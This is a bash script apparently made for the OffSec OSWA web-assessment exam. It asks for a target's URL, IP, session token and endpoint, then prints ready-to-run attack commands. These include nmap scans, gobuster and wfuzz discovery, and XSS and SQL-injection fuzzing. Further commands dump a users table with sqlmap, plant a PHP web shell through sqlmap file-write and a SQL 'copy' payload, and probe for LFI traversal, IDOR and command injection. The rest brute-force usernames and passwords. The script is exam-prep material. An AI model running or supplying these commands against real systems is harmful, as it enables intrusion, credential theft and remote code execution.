#!/bin/bash

# Create an output file with the timestamp
OUTPUT_FILE="recon_$IP.txt"

# ANSI escape codes for green text
GREEN='\033[0;32m'
NC='\033[0m' # No Color
GRAY="\033[0;37m"
RESET="\033[0m"

echo "========================="
echo "OSWA Recon Commands"
echo "Designed By Cuong Nguyen"
echo "========================="

# Prompt user for input
echo -e "Enter the target URL (e.g., http://target:80)" | tee -a "$OUTPUT_FILE"
read -p "URL: " URL
echo -e "Enter the target IP address (e.g., 10.1.1.1)" | tee -a "$OUTPUT_FILE"
read -p "IP Address: " IP
echo -e "Enter the session token (e.g., SESSION=token)" | tee -a "$OUTPUT_FILE"
read -p "Token: " TOKEN
echo -e "Enter endpoint (e.g., /index.php?id=)" | tee -a "$OUTPUT_FILE"
read -p "Endpoint: " ENDPOINT
echo "" | tee -a "$OUTPUT_FILE"

# Combine URL and endpoint with FUZZ
COMBINED_URL="$URL$ENDPOINT"  # Full URL (URL + endpoint)
FINAL_URL="${COMBINED_URL}FUZZ"  # Adding FUZZ at the end

echo -e "${GREEN}[i] Final URL with FUZZ${NC}" | tee -a "$OUTPUT_FILE"
echo "$FINAL_URL" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] Nmap scan${NC}" | tee -a "$OUTPUT_FILE"
echo "sudo nmap -p- -sV -sS -Pn -A $IP" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] Nmap scan 2${NC}" | tee -a "$OUTPUT_FILE"
echo "sudo nmap -p- -sV -sC $IP" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] Nmap scan 3${NC}" | tee -a "$OUTPUT_FILE"
echo "sudo nmap -p- -T4 -A $IP" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] Gobuster Directory Discovery (big.txt)${NC}" | tee -a "$OUTPUT_FILE"
echo "gobuster dir -u $URL -w /usr/share/wordlists/dirb/big.txt" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] Gobuster - Directory Discovery (directory-list-lowercase-2.3-medium.txt)${NC}" | tee -a "$OUTPUT_FILE"
echo "gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] Gobuster - Directory Discovery (raft-medium-directories-lowercase.txt)${NC}" | tee -a "$OUTPUT_FILE"
echo "gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] Gobuster File Discovery (raft-medium-files.txt)${NC}" | tee -a "$OUTPUT_FILE"
echo "gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt" | tee -a "$OUTPUT_FILE"


echo -e "${GREEN}[i] Gobuster - Endpoint Discovery${NC}" | tee -a "$OUTPUT_FILE"
echo "gobuster dns -d $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Directory Discovery${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404,301 \"$URL/FUZZ/\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Authenticated Discovery${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 -b \"PARAM=value\" \"$URL/FUZZ/\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - File Discovery${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404 \"$URL/FUZZ\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Authenticated Discovery${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404,403 -b \"PARAM=value\" \"$URL/FUZZ\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Get Parameter Values${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 \"$URL/index.php?parameter=FUZZ\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - HTML Escape Fuzzing${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt \"$URL/FUZZ\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] XSS Discovery${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 \"$FINAL_URL\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] SQL - Fuzzing GET Parameter${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u \"$FINAL_URL\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] SQL - Fuzzing POST Parameter${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d \"id=1FUZZ\" -u \"$URL/index.php\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] SQLMAP - GET Parameter${NC}" | tee -a "$OUTPUT_FILE"
echo "sudo sqlmap -u \"$URL/$ENDPOINT\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] SQLMAP - POST Parameter${NC}" | tee -a "$OUTPUT_FILE"
echo "Note: Copy POST request from Burp Suite into post.txt file" | tee -a "$OUTPUT_FILE"
echo "sqlmap -r request.txt --level=5 --risk=3 -a -batch" | tee -a "$OUTPUT_FILE"
echo "sqlmap -r request.txt --level=5 --risk=3 --dbs" | tee -a "$OUTPUT_FILE"
echo "sqlmap -r request.txt --level=5 --risk=3 -D piano_protocol --tables" | tee -a "$OUTPUT_FILE"
echo "sqlmap -r request.txt --level=5 --risk=3 -D piano_protocol -T users --dump" | tee -a "$OUTPUT_FILE"
echo "sqlmap -u http:/IP/endpoint -p passengerCount --cookie=PHPSESSID=e19c4a73cf14882400d1a6ea0a9d0edd --method POST --data 'firstName=hacker&lastName=hacker&departCode=KOR&destinationCode=MEL&passengerCount=1&pilotMessage=None&username=cuong&dType=editFlight&flightNum=6' -p 'passengerCount' --file-write='/var/www/html/shell.php' --file-dest='/var/tmp/shell.php'" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] SQLMAP - Uploading File${NC}" | tee -a "$OUTPUT_FILE"
echo "1';copy(select '<?php passthru($_GET[''cmd'']);?>') to '/var/tmp/cmd.php'; -- -" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Directory Traversal (LFI)${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 \"$FINAL_URL\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - LFI App Specific Files${NC}" | tee -a "$OUTPUT_FILE"
echo "Create two wordlists (paths.txt):../../../etc" | tee -a "$OUTPUT_FILE"
echo "Contain custom files related to web technology that is used (Example: Look at /error endpoint; application.properties application.yml)" | tee -a "$OUTPUT_FILE"
echo "wfuzz -w paths.txt -w files.txt --hh 0 \"$URL/index.php?id=FUZZFUZ2Z\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Static File IDOR${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z range,1-100 --hc 404 \"$FINAL_URL.txt\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - ID Based IDOR${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z range,1-100 --hc 404 \"$FINAL_URL\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - User Discovery Brute Forcing${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 $FINAL_URL/FUZZ" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Password Discovery Brute Forcing${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d 'username=admin&password=FUZZ' '$URL/login.php'" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - LFI${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 81,125 \"$URL$ENDPOINT../../../../../../../../../../FUZZ" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - XSS${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt --hc 404,301 \"$FINAL_URL\"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Bypass Blocklist Strings${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,bogus_wordlist.txt --hc 404 "$URL$ENDPOINT127.0.0.1;FUZZ"" | tee -a "$OUTPUT_FILE"

echo -e "${GREEN}[i] WFUZZ - Check Capabilities${NC}" | tee -a "$OUTPUT_FILE"
echo "wfuzz -c -z file,capabilities_check_custom.txt --hc 404 --hh 204 -b PHPSESSID=a153abc1706896a79170e90268399fa6 "$URL$ENDPOINT/which+FUZZ"" | tee -a "$OUTPUT_FILE"
